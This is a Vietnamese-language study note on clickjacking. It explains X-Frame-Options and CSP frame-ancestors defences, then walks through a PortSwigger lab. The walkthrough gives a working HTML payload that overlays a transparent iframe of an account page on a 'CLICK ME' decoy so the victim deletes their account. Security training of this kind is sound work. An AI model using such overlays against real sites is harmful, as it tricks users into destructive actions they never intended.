# **Clickjacking (UI redressing)**

## **Clickjacking là gì ?**

- Clickjacking là một cuộc tấn công dựa trên giao diện, trong đó người dùng bị lừa nhấp vào nội dung có thể thực hiện được trên một trang web ẩn.

![](./img_Clickjacking/click-1.png)

## **Làm thế nào để ngăn chặn các cuộc tấn công clickjacking**

- Hai cơ chế phía máy chủ để ngăn ngừa clickjacking:
  - `X-Frame-Options`:
    - X-Frame-Options: deny (ngăn chặn bất kỳ tên miền nào đóng khung nội dung)
    - X-Frame-Options: sameorigin (chỉ cho phép trang web hiện tại đóng khung nội dung.)
    - X-Frame-Options: allow-from <https://normal-website.com>(cho phép 'uri' được chỉ định đóng khung trang này.)
  - `Content Security Policy (CSP)`:
    - Content-Security-Policy: policy
    - Content-Security-Policy: frame-ancestors 'self';
    - Content-Security-Policy: frame-ancestors normal-website.com;

## **LAB clickjacking**

> ### **Basic clickjacking with CSRF token protection**

- Sau khi trải nghiệm trang web tôi đã đăng nhập account và có chức năng xóa tài khoản. Vậy tôi đã tạo một trang web đồng thời tạo một button click. Nếu người dùng click vào trang web thì trang tài khoản người dùng sẽ bị xóa. Bằng cách tôi sẽ ghi đè button lên trường deleted như sau:

```html
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:515px;
        left:60px;
        z-index: 1;
    }
</style>
<div>CLICK ME</div>
<iframe src="https://0ad8004a0460bd4bc01ea4720008001b.web-security-academy.net/my-account"></iframe>
```

![](./img_Clickjacking/lab-1.png)
